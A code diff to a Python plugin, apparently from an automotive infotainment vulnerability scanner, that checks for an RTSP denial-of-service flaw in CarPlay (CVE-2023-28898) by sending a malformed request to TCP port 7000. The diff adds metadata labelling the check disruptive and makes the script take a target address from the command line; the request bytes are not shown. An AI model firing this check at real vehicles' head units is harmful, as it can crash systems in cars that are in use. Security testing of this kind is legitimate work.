@@ -28,7 +28,15 @@ class RTSPCarPlayDoSPlugin(IVIVulnerabilityPlugin):
     向目标主机的 IP 地址 (例如: '10.173.189.1') TCP:7000 端口发送畸形 RTSP 请求，通过判断服务响应异常（连接重置/无响应）
     来确认漏洞是否存在。二次确认机制用于区分临时抖动与真实崩溃。
     """
+    meta_poc_name = "RTSP CarPlay DoS"
+    meta_cve_id = "CVE-2023-28898"
+    meta_severity = "High"
+    meta_protocol = "tcp"
+    meta_target_os = ["automotive_linux", "qnx"]
+    meta_required_params = ["target_ip"]
     is_disruptive = True
+    meta_destructive_level = "Restart"
+    
     RTSP_PORT = 7000
     # 触发 DoS 的畸形 RTSP 请求
     MALFORMED_REQUEST = (
@@ -155,5 +163,5 @@ if __name__ == "__main__":
     if len(sys.argv) < 3:
         print("Usage: python3 60_RTSP_CarPlay_DoS.py <args>")
         sys.exit(1)
-    plugin = RTSPCarPlayDoSPlugin(config)
+    plugin = RTSPCarPlayDoSPlugin({"target_ip": sys.argv[1], "target_port": int(sys.argv[2])})
     plugin.run_verify()
